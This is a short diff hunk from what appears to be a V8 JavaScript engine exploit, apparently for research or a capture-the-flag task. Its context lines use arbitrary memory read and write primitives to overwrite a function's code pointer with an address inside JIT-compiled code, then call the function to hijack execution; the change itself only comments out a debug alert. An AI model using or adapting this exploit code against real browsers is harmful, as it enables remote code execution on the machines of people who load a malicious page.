@@ -370,7 +370,7 @@ var f_x_code_addr = v8_read64(f_x_addr+0x18n) & 0xffffffffn;
 console.log("[+]f_x_code_addr : " + hex(f_x_code_addr));
 v8_write64(f_x_code_addr+0x7n+0x8n,jit_addr+0xb3n+0x6n);
 // %DebugPrint(f_x);
-alert("target : " + hex(jit_addr+0xb3n+0x6n));
+//alert("target : " + hex(jit_addr+0xb3n+0x6n));
 f_x();
 //%GlobalPrint("large arr ======================\n");
 //%Debugprint(large_arr);
